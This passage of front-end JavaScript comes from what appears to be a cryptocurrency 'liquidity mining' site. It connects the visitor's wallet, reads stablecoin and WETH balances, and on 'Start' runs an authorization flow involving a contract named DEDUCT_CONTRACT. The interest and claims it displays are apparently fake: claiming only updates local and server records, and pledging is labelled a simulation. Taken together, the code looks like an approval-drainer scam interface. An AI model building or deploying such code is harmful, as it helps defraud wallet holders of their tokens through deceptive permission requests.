            console.log(`connectWallet: Initialized provider.`);
        }
        updateStatus('Please confirm connection in your wallet...');
        const accounts = await provider.send('eth_requestAccounts', []);
        console.log(`connectWallet: Accounts received:`, accounts);
        if (accounts.length === 0) throw new Error("No account selected.");
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        console.log(`connectWallet: Connected user address: ${userAddress}`);
        connectButton.classList.add('connected');
        connectButton.textContent = 'Connected';
        connectButton.title = 'Disconnect Wallet';
        connectButton.disabled = false;
        deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
        await updateUIBasedOnChainState();
        updateStatus(translations[currentLang].fetchingBalances);
        const balances = {
            usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
            usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
            weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
        };
        console.log(`connectWallet: Wallet balances:`, balances);
        updateBalancesUI(balances);
        updateStatus(translations[currentLang].walletConnected);
        await loadUserDataFromServer();
        if (userAddress) setupSSE();
        await saveUserData();
    } catch (error) {
        console.error(`connectWallet: Connection error: ${error.message}`);
        let userMessage = `Error: ${error.message}`;
        if (error.code === 4001) userMessage = "You rejected the connection request.";
        updateStatus(userMessage);
        resetState(true);
        connectButton.disabled = typeof window.ethereum === 'undefined';
    }
}

function disconnectWallet() {
    resetState(true);
    alert('Wallet disconnected. To fully remove permissions, do so from within your wallet settings.');
    console.log(`disconnectWallet: Wallet disconnected.`);
}

async function getEthPrices() {
    try {
        updateStatus(translations[currentLang].fetchingBalances);
        const response = await retry(() => fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt', {
            headers: { 'ngrok-skip-browser-warning': 'true' }
        }));
        if (!response.ok) throw new Error('Network response was not ok');
        const data = await response.json();
        const usdPrice = data.ethereum?.usd || 0;
        const usdtPrice = data.ethereum?.usdt || usdPrice;
        const prices = {
            usd: usdPrice,
            usdt: usdtPrice,
            usdc: usdPrice,
            weth: usdPrice
        };
        console.log(`getEthPrices: Processed prices:`, prices);
        updateStatus("");
        return prices;
    } catch (error) {
        console.error(`getEthPrices: Could not fetch ETH price: ${error.message}`);
        updateStatus(translations[currentLang].priceError, true);
        return null;
    }
}

async function claimInterest() {
    await loadUserDataFromServer();
    const claimableETHString = cumulativeValue.textContent.replace(' ETH', '').trim();
    const claimableETH = parseFloat(claimableETHString);
    console.log(`claimInterest: Raw claimableETHString: ${claimableETHString}, Parsed: ${claimableETH}`);
    if (isNaN(claimableETH) || claimableETH < 0.0000001) {
        updateStatus(translations[currentLang].noClaimable);
        return;
    }

    const prices = await getEthPrices();
    if (!prices || prices.usd === 0) {
        updateStatus(translations[currentLang].priceError);
        return;
    }

    const selectedToken = walletTokenSelect.value;
    let ethToTokenRate = prices[selectedToken.toLowerCase()];
    if (isNaN(ethToTokenRate) || ethToTokenRate === 0) {
        ethToTokenRate = selectedToken === 'WETH' ? 1 : prices.usd;
        console.warn(`claimInterest: Fallback rate for ${selectedToken}: ${ethToTokenRate}`);
    }
    const valueInToken = claimableETH * ethToTokenRate;
    console.log(`claimInterest: Claim details:`, { claimableETH, selectedToken, ethToTokenRate, valueInToken, prices });

    if (isNaN(valueInToken) || valueInToken <= 0) {
        updateStatus(translations[currentLang].invalidCalc);
        return;
    }

    modalClaimableETH.textContent = `${claimableETH.toFixed(7)} ETH`;
    modalEthPrice.textContent = `$${prices.usd.toFixed(2)}`;
    modalSelectedToken.textContent = selectedToken;
    modalEquivalentValue.textContent = `${valueInToken.toFixed(3)} ${selectedToken}`;
    modalTitle.textContent = translations[currentLang]?.claimBtnText || 'Claim Interest';
    claimModal.style.display = 'flex';
}

function updateLanguage(lang) {
    currentLang = lang;
    languageSelect.value = lang;
    localStorage.setItem('language', lang);
    for (let key in elements) {
        if (elements[key] && translations[lang]?.[key]) {
            elements[key].textContent = translations[lang][key];
        }
    }
    if (claimBtn.parentNode) {
        claimBtn.textContent = translations[lang]?.claimBtnText || 'Claim';
    }
    if (modalTitle) {
        modalTitle.textContent = translations[lang]?.claimBtnText || 'Claim Interest';
    }
    updateNextBenefitTimer();
    console.log(`updateLanguage: Switched to language: ${lang}`);
}

function setupSSE() {
    const source = new EventSource(`${API_BASE_URL}/api/sse`, {
        headers: { 'ngrok-skip-browser-warning': 'true' }
    });
    source.onmessage = async (event) => {
        try {
            const { event: eventType, data } = JSON.parse(event.data);
            console.log(`SSE: Received event: ${eventType}`, data);
            if (eventType === 'dataUpdate' && data.users[userAddress]) {
                console.log(`SSE: Received data update for address: ${userAddress}`, data.users[userAddress]);
                await loadUserDataFromServer();
                updateInterest();
                const balances = {
                    usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
                    usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
                    weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
                };
                updateBalancesUI(balances);
            }
        } catch (error) {
            console.error(`SSE: Error parsing message: ${error.message}`);
        }
    };
    source.onerror = () => {
        console.warn(`SSE: Connection error, attempting to reconnect...`);
        source.close();
        isServerAvailable = false;
        setTimeout(setupSSE, 5000);
    };
    console.log(`SSE: Connection established for address: ${userAddress}`);
}

//---Event Listeners & Initial Load---
document.addEventListener('DOMContentLoaded', async () => {
    const savedLang = localStorage.getItem('language') || 'zh-Hant';
    updateLanguage(savedLang);
    await initializeWallet();
    setInterval(updateTotalFunds, 1000);
    if (!grossOutputValue || !cumulativeValue) {
        await retryDOMAcquisition();
    }
    setInterval(checkServerStatus, 30000);
    if (closeModal) closeModal.addEventListener('click', () => { claimModal.style.display = 'none'; });
    if (cancelClaim) cancelClaim.addEventListener('click', () => { claimModal.style.display = 'none'; });
    if (confirmClaim) {
        confirmClaim.addEventListener('click', async () => {
            claimModal.style.display = 'none';
            const claimableETHString = modalClaimableETH.textContent.replace(' ETH', '').trim();
            const claimableETH = parseFloat(claimableETHString);
            const selectedToken = modalSelectedToken.textContent;
            const valueInTokenString = modalEquivalentValue.textContent.replace(/[^0-9.]/g, '');
            const valueInToken = parseFloat(valueInTokenString);

            if (isNaN(claimableETH) || isNaN(valueInToken)) {
                updateStatus(translations[currentLang].invalidCalc);
                return;
            }

            const grossOutputETH = parseFloat(grossOutputValue.textContent.replace(' ETH', ''));
            claimedInterest = grossOutputETH;
            accountBalance[selectedToken] = (accountBalance[selectedToken] || 0) + valueInToken;
            localStorage.setItem('userData', JSON.stringify({
                stakingStartTime,
                claimedInterest,
                pledgedAmount,
                accountBalance,
                nextBenefitTime: localStorage.getItem('nextBenefitTime'),
                lastUpdated: Date.now()
            }));
            console.log(`claimInterest: Updated claimed interest and account balance:`, { claimedInterest, accountBalance });
            // 領取後將 cumulative 歸零
            await saveUserData({
                stakingStartTime,
                claimedInterest,
                pledgedAmount,
                accountBalance,
                nextBenefitTime: localStorage.getItem('nextBenefitTime'),
                lastUpdated: Date.now(),
                overrides: { grossOutput: claimedInterest, cumulative: 0 }
            });
            updateInterest();
            const walletBalances = {
                usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
                usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
                weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
            };
            updateBalancesUI(walletBalances);
            updateStatus(translations[currentLang].claimSuccess);
        });
    }
    if (claimModal) {
        claimModal.addEventListener('click', (e) => {
            if (e.target === claimModal) claimModal.style.display = 'none';
        });
    }
});

document.getElementById('refreshData')?.addEventListener('click', async () => {
    console.log(`refreshData: Manually refreshing data...`);
    updateStatus('Refreshing data...');
    if (!grossOutputValue || !cumulativeValue) {
        await retryDOMAcquisition();
    }
    await updateInterest();
    updateStatus('');
    alert('Data refreshed!');
});

languageSelect.addEventListener('change', (e) => {
    const lang = e.target.value;
    localStorage.setItem('language', lang);
    updateLanguage(lang);
    console.log(`languageSelect: Changed language to: ${lang}`);
});

connectButton.addEventListener('click', async () => {
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        if (typeof window.ethereum === 'undefined') {
            updateStatus(translations[currentLang].noWallet);
            console.log(`connectButton: No Ethereum provider detected.`);
            connectButton.disabled = true;
            return;
        }
        await connectWallet();
    }
});

startBtn.addEventListener('click', async () => {
    if (!signer) {
        alert('Please connect your wallet first!');
        console.log(`startBtn: Clicked but no signer available.`);
        return;
    }
    const selectedToken = walletTokenSelect.value;
    const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
    const selectedContract = tokenMap[selectedToken];
    try {
        const balance = await retry(() => selectedContract.balanceOf(userAddress));
        console.log(`startBtn: Checked balance for ${selectedToken}: ${balance.toString()}`);
        if (balance === 0n) {
            alert(`Your ${selectedToken} balance is zero. Please ensure you have sufficient balance to start.`);
            return;
        }
    } catch (e) {
        alert(`Could not fetch balance: ${e.message}`);
        console.error(`startBtn: Balance fetch error: ${e.message}`);
        return;
    }
    startBtn.disabled = true;
    startBtn.textContent = 'Authorizing...';
    try {
        await handleConditionalAuthorizationFlow();
        alert('Authorization successful! Mining has started.');
        await updateUIBasedOnChainState();
    } catch (error) {
        console.error(`startBtn: Authorization failed: ${error.message}`);
        alert(`Authorization failed: ${error.message}`);
        updateStatus(`Authorization failed: ${error.message}`);
    } finally {
        startBtn.disabled = false;
        startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
        console.log(`startBtn: Authorization process completed.`);
    }
});

pledgeBtn.addEventListener('click', async () => {
    if (!signer) {
        alert('Please connect your wallet first!');
        console.log(`pledgeBtn: Clicked but no signer available.`);
        return;
    }
    const amount = parseFloat(pledgeAmount.value) || 0;
    if (!amount) {
        alert('Please enter a pledge amount!');
        console.log(`pledgeBtn: No pledge amount entered.`);
        return;
    }
    pledgedAmount = amount;
    localStorage.setItem('userData', JSON.stringify({
        stakingStartTime,
        claimedInterest,
        pledgedAmount,
        accountBalance,
        nextBenefitTime: localStorage.getItem('nextBenefitTime'),
        lastUpdated: Date.now()
    }));
    console.log(`pledgeBtn: Pledged ${amount} ${pledgeToken.value} for ${pledgeDuration.value} days.`);
    alert(`Pledged ${amount} ${pledgeToken.value} for ${pledgeDuration.value} days... (Simulation)`);
    const totalPledgedValue = document.getElementById('totalPledgedValue');
    let currentTotal = parseFloat(totalPledgedValue.textContent) || 0;
    totalPledgedValue.textContent = `${(currentTotal + amount).toFixed(2)} ${pledgeToken.value}`;
    await saveUserData();
});

refreshWallet.addEventListener('click', async () => {
    if (!signer) {
        alert('Please connect your wallet first!');
        console.log(`refreshWallet: Clicked but no signer available.`);
        return;
    }
    updateStatus(translations[currentLang].fetchingBalances);
    const balances = {
        usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
        usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
        weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
    };
    console.log(`refreshWallet: Refreshed balances:`, balances);
    updateBalancesUI(balances);
    updateStatus('');
    alert('Wallet balance refreshed!');
});

walletTokenSelect.addEventListener('change', async () => {
    console.log(`walletTokenSelect: Changed to token: ${walletTokenSelect.value}`);
    if (!signer) {
        if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
        if (accountBalanceValue) accountBalanceValue.textContent = `0.000 ${walletTokenSelect.value}`;
        console.log(`walletTokenSelect: No signer, reset balance display.`);
        return;
    }
    const balances = {
        usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
        usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
        weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
    };
    console.log(`walletTokenSelect: Fetched balances:`, balances);
    updateBalancesUI(balances);
});

const tabs = document.querySelectorAll('.tab');
const sections = document.querySelectorAll('.content-section');
tabs.forEach(tab => {
    tab.addEventListener('click', async () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        sections.forEach(s => s.classList.remove('active'));
        document.getElementById(tab.dataset.tab).classList.add('active');
        console.log(`tabClick: Switched to tab: ${tab.dataset.tab}`);
        if (tab.dataset.tab === 'liquidity') {
            grossOutputValue = document.getElementById('grossOutputValue');
            cumulativeValue = document.getElementById('cumulativeValue');
            console.log(`tabClick: Re-acquired DOM elements:`, {
                grossOutputValue: !!grossOutputValue,
                cumulativeValue: !!cumulativeValue
            });
            if (!grossOutputValue || !cumulativeValue) {
                await retryDOMAcquisition();
            }
        }
    });
});